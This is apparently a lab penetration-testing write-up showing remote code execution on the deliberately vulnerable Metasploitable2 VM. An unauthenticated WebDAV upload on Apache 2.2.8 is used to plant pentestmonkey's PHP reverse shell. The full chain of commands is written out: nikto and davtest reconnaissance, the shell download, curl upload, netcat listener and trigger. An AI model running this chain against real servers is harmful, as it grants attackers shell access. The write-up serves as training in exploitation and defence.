# Exploit Title: WebDAV File Upload & Remote Code Execution (php-reverse-shell)
## Target: Metasploitable2 - Apache/2.2.8 with WebDAV enabled
## Date: [Insert Date]
## Author: George Lazai
## MITRE ATT&CK Technique: T1190 - Exploit Public-Facing Application

---

## Summary

This exploit targets a misconfigured WebDAV service running on Apache 2.2.8 that allows unauthenticated file uploads and execution of `.php` scripts. We use this misconfiguration to upload a malicious PHP reverse shell and gain remote shell access on the target.

---

## Step-by-Step Exploit Process

###  Step 1: Service Discovery

Using Nikto, we discovered `/dav/` as a WebDAV-enabled path:

bash
nikto -h http://192.168.6.3

### Step 2: WebDAV Verification
We used davtest to verify file upload and execution support:

davtest -url http://192.168.6.3/dav

Result: Upload:  Success

Execution: .php  Success

### Step 3: Prepare Reverse Shell

Downloaded php-reverse-shell.php from Pentestmonkey:

wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Modified the file: 
$ip = '192.168.6.4';    // Our attacker's IP
$port = 4444;           // Port to listen on

### Step 4: Upload Shell

Uploaded the PHP reverse shell to the WebDAV directory:

curl -T php-reverse-shell.php http://192.168.6.3/dav/DavTestDir_<random>/php-reverse-shell.php

###  Step 5: Set Up Listener

On attacker's machine:

nc -lvnp 4444

### Step 6: Trigger Reverse Shell

In browser or via curl:

curl http://192.168.6.3/dav/DavTestDir_<random>/php-reverse-shell.php

Result:

Reverse shell successfully opened:

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(See available screenshot)

Notes
WebDAV was confirmed using http-methods Nmap script:

nmap -p 80 --script http-methods --script-args http-methods.url-path='/dav/' 192.168.6.3
PHP execution was enabled on /dav/.

This exploit demonstrates Remote Code Execution (RCE) through WebDAV misconfiguration.

MITRE ATT&CK Mapping

Tactic	Technique
Initial Access	T1190 - Exploit Public-Facing Application
Execution	T1059.009 - Command and Scripting Interpreter: PHP